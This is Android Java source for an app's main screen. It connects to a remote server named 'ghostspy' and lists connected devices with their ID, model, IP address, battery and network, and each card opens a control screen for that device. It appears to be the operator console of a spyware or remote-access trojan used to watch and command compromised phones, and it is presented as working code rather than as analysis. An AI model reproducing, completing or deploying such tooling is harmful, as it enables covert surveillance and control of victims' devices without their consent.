package com.testapp;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.*;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONArray;
import org.json.JSONObject;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    private Socket socket;
    private TextView statusText;
    private LinearLayout deviceContainer;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        statusText = findViewById(R.id.statusText);
        deviceContainer = findViewById(R.id.deviceContainer);
        statusText.setText("⏳ Menghubungkan...");

        try {
            socket = IO.socket("https://ghostspy.bruang.biz.id");
        } catch (URISyntaxException e) {
            statusText.setText("❌ URL Error");
            return;
        }

        socket.on(Socket.EVENT_CONNECT, args -> {
            runOnUiThread(() -> {
                statusText.setText("🟢 ONLINE");
                socket.emit("get_devices");
            });
        });

        socket.on("devices_list", args -> {
            try {
                JSONArray devices = (JSONArray) args[0];
                List<String[]> list = new ArrayList<>();
                for (int i = 0; i < devices.length(); i++) {
                    JSONObject d = devices.getJSONObject(i);
                    list.add(new String[]{
                        d.getString("id"),
                        d.getString("model"),
                        d.optString("android", "?"),
                        d.optString("ip", ""),
                        d.optString("last_seen", ""),
                        d.optString("battery", "?"),
                        d.optString("network", "?")
                    });
                }
                runOnUiThread(() -> {
                    deviceContainer.removeAllViews();
                    if (list.isEmpty()) {
                        statusText.setText("🟢 ONLINE | 0 perangkat");
                        return;
                    }
                    for (String[] data : list) {
                        // Kartu premium
                        LinearLayout card = new LinearLayout(MainActivity.this);
                        card.setOrientation(LinearLayout.VERTICAL);
                        card.setBackgroundColor(0xFF1A1A2E);
                        card.setPadding(24, 20, 24, 20);
                        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                                LinearLayout.LayoutParams.MATCH_PARENT,
                                LinearLayout.LayoutParams.WRAP_CONTENT);
                        lp.setMargins(0, 0, 0, 16);
                        card.setLayoutParams(lp);
                        // Efek border manual (garis tipis)
                        card.setBackground(getDrawable(R.drawable.card_border));

                        TextView idView = new TextView(MainActivity.this);
                        idView.setText("🆔 " + data[0]);
                        idView.setTextColor(0xFFFF1E5A);
                        idView.setTextSize(16);
                        idView.setTypeface(null, android.graphics.Typeface.BOLD);

                        TextView modelView = new TextView(MainActivity.this);
                        modelView.setText("📱 " + data[1] + " | " + data[2]);
                        modelView.setTextColor(0xFFFFFFFF);
                        modelView.setTextSize(15);

                        TextView infoView = new TextView(MainActivity.this);
                        infoView.setText("IP: " + data[3] + " | Bat: " + data[5] + "% | " + data[6]);
                        infoView.setTextColor(0xFF9AA3B2);
                        infoView.setTextSize(12);

                        card.addView(idView);
                        card.addView(modelView);
                        card.addView(infoView);

                        card.setOnClickListener(v -> {
                            Intent i = new Intent(MainActivity.this, ControlActivity.class);
                            i.putExtra("deviceId", data[0]);
                            i.putExtra("deviceModel", data[1]);
                            i.putExtra("battery", data[5]);
                            i.putExtra("network", data[6]);
                            startActivity(i);
                        });

                        deviceContainer.addView(card);
                    }
                    statusText.setText("🟢 ONLINE | " + list.size() + " perangkat");
                });
            } catch (Exception e) {
                runOnUiThread(() -> statusText.setText("⚠️ Parse error"));
            }
        });

        socket.on(Socket.EVENT_CONNECT_ERROR, args -> {
            runOnUiThread(() -> statusText.setText("🔴 OFFLINE"));
        });

        socket.connect();
    }

    @Override
    protected void onDestroy() {
        if (socket != null) socket.disconnect();
        super.onDestroy();
    }
}
